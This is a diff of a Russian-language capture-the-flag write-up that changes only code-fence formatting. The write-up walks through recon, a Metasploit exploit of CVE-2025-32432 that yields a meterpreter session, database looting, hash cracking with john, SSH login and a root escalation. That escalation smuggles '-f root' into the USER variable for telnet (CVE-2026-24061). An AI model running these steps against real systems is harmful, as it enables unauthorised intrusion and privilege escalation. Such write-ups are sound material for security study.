@@ -8,9 +8,9 @@
 
 Запускаем nmap сканирование:
 
-'''bash
+```bash
 nmap -sC -sV Ip-цели
-
+```
 ![Результат сканирования Nmap](image/nmap-scan.jpg)
 
 
@@ -18,9 +18,9 @@ nmap -sC -sV Ip-цели
 
 Запуск сканера Gobuster:
 
-'''bash
+```bash
 gobuster dir -u  http://IP-цели -w /usr/share/wordlists/dirb/common.txt
-
+```
 
 ![Результат сканирования Gobuster](image/gobuster.jpg)
 
@@ -36,10 +36,10 @@ gobuster dir -u  http://IP-цели -w /usr/share/wordlists/dirb/common.txt
 
 Зайдя в msfconsole, проверим наличие данной cve командой:
 
-'''msf
+```msf
 
 search CVE-2025-32432
-
+```
 ![msf](image/msf.jpg)
 
 Используем эту cve и устонавливаем параметры RHOSTS URL-страницы с /admin/login и LHOST наш IP и командой "run" мы получаем сессию meterpreter
@@ -60,10 +60,10 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 Следовательно мы можем проверить эту БД командой:
 
-'''bash
+```bash
 
 mysql -u root -p пароль
-
+```
 Выводим командой "show databases;" все БД и находим там БД Orion
 
 Заходим туда командой "use orion" и раскрываем все столбцы "show tables;"
@@ -74,24 +74,24 @@ mysql -u root -p пароль
 
 Далее через john расшифровывем хэш командой:
 
-'''bash
+```bash
 
 john --wordlist=/usr/share/wordlists/rockyou.txt hash(файл с хешом)
-
+```
 Получив пароль заходим от имени найденного в бд пользователя в его сессию ssh командой:
 
-'''bash
+```bash
 
 ssh имя пользователя@Ip-цели
-
+```
 Зайдя в сессию назодим файл user.txt который содержит первый флаг
 
 Для получения доступа в root необходимо воспользоваться командой:
 
-'''bash
+```bash
 
 USER='-f root' telnet -a IP-локального адреса (чаще всего 127.0.0.1)"
-
+```
 Это команда относиться к уязвимой версии telnet (CVE-2026-24061)
 
 ##Тупики (DeadEnds)
